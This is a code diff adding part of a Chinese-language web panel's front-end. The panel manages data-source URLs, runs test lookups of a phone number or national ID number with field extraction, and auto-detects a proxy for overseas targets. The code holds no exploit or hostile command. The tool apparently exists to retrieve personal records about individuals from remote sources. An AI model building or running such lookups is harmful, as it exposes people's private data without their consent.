+          <span class="pill ${t.enabled ? 'on' : 'off'}">${t.enabled ? '启用' : '停用'}</span>
+          <span class="nm">${escapeHtml(t.name || '(未命名)')}</span>
+          <span class="url">${escapeHtml(t.url)}</span>
+          <span class="hint">${escapeHtml(t.type || '')} ${escapeHtml(t.body || '')}</span>
+          <button class="ghost" data-tg="${t.i}" data-act="toggle">${t.enabled ? '停用' : '启用'}</button>
+          <button class="ghost" data-tg="${t.i}" data-act="test">试查</button>
+          <button class="ghost" data-tg="${t.i}" data-act="del">删除</button>
+        </div>`).join('');
+
+        $('qcTargets').querySelectorAll('[data-tg]').forEach((b) => {
+          b.onclick = async () => {
+            const i = parseInt(b.getAttribute('data-tg'), 10);
+            const act = b.getAttribute('data-act');
+            try {
+              if (act === 'toggle') {
+                const cur = (await api('/api/quick/targets')).targets[i];
+                await api('/api/quick/targets/set', { i, enabled: !cur.enabled });
+              } else if (act === 'del') {
+                await api('/api/quick/targets/remove', { i });
+              } else {
+                doTest(i);
+                return;
+              }
+              await loadTargets();
+            } catch (e) { $('qcTestMsg').innerHTML = '<span class="bad">' + escapeHtml(e.message) + '</span>'; }
+          };
+        });
+      } catch (e) {
+        $('qcTargets').innerHTML = '<div class="bad">' + escapeHtml(e.message) + '</div>';
+      }
+    }
+
+    async function doTest(i, input) {
+      const v = input || $('qcTestInput').value.trim();
+      if (!v) { $('qcTestMsg').innerHTML = '<span class="bad">先填要查的手机号/身份证</span>'; return; }
+      $('qcTestMsg').innerHTML = '<span class="hint">查询中…</span>';
+      try {
+        const r = await api('/api/quick/test', { i, input: v });
+        const rows = Object.entries(r.fields || {}).map(([k, x]) =>
+          `<tr><th>${escapeHtml(k)}</th><td>${x ? escapeHtml(String(x)) : '<span class="empty">—</span>'}</td></tr>`).join('');
+        $('qcTestOut').innerHTML = `<div class="card"><h3>试查结果 · HTTP ${r.status} · ${r.ms}ms</h3>
+          <table>${rows || '<tr><td class="empty">没抽出字段</td></tr>'}</table>
+          <details><summary>原始响应</summary><pre class="reply">${escapeHtml(r.raw || '')}</pre></details></div>`;
+        $('qcTestMsg').innerHTML = Object.values(r.fields || {}).some(Boolean)
+          ? '<span class="ok">抽到数据</span>' : '<span class="warn">有响应但没抽出字段，可能参数名或抽取规则不对</span>';
+      } catch (e) {
+        $('qcTestMsg').innerHTML = '<span class="bad">' + escapeHtml(e.message) + '</span>';
+      }
+    }
+    $('qcTest').onclick = async () => {
+      try {
+        const j = await api('/api/quick/targets');
+        const on = (j.targets || []).filter((t) => t.enabled);
+        if (!on.length) { $('qcTestMsg').innerHTML = '<span class="bad">没有启用的数据源</span>'; return; }
+        await doTest(on[0].i);
+      } catch (e) { $('qcTestMsg').innerHTML = '<span class="bad">' + escapeHtml(e.message) + '</span>'; }
+    };
+
+    $('netDetect').onclick = async () => {
+      $('netMsg').innerHTML = '<span class="hint">检测中…</span>';
+      try {
+        const d = await api('/api/net/detect');
+        if (!d.found || !d.found.length) {
+          $('netOut').innerHTML = '<div class="bad">没检测到系统代理。如果目标站在境外，你需要先开一个代理（Clash/V2Ray 等），然后把地址填进来。</div>';
+        } else {
+          $('netOut').innerHTML = '<div class="hint">检测到 ' + d.found.length + ' 个代理（来源：' + escapeHtml(d.source) + '）：' +
+            d.found.map((p) => '<code>' + escapeHtml(p) + '</code>').join(' ') + '</div>';
+          // 自动套用第一个
+          await api('/api/config', { proxy: d.found[0] });
+          $('netMsg').innerHTML = '<span class="ok">已套用 ' + escapeHtml(d.found[0]) + '</span>';
+          if ($('proxyCfg')) $('proxyCfg').value = d.found[0];
+          return;
+        }
+      } catch (e) { $('netOut').innerHTML = '<div class="bad">' + escapeHtml(e.message) + '</div>'; }
+      $('netMsg').innerHTML = '';
+    };
+
+    $('netCheck').onclick = async () => {
+      $('netOut').innerHTML = '<div class="hint">测试中…</div>';
+      try {
+        const r = await api('/api/net/check', {});
+        const line = (n, x) => '<div class="hint">' + n + '：' + (x ? (x.ok ? '<span class="ok">通（HTTP ' + x.status + '，' + x.ms + 'ms）</span>' : '<span class="bad">不通（' + escapeHtml(x.error) + '）</span>') : '<span class="empty">未测</span>') + '</div>';
+        $('netOut').innerHTML = '<div class="card"><h3>连通性：' + escapeHtml(r.url) + '</h3>' +
+          line('走代理' + (r.proxyUrl ? '（' + escapeHtml(r.proxyUrl) + '）' : ''), r.proxy) +
+          line('直连', r.direct) +
+          '<div class="hint">' + (r.proxy && r.proxy.ok ? '代理可用。' : (r.direct && r.direct.ok ? '直连可用。' : '两条都不通 —— 目标站需要代理，请先开启代理并点「自动检测系统代理」。')) + '</div></div>';
+      } catch (e) { $('netOut').innerHTML = '<div class="bad">' + escapeHtml(e.message) + '</div>'; }
+    };
+
+    (async () => {
+      await loadTargets();
+      try {
+        const d = await api('/api/net/detect');
+        $('netNow').textContent = d.current || '未配置' + (d.found && d.found.length ? '（检测到系统代理：' + d.found[0] + '）' : '');
+      } catch (e) { $('netNow').textContent = '读取失败'; }
+    })();
+
+    (async () => { await loadTgStatus(); await fillApiFields(); })();
+  </script>
+</body>
+</html>
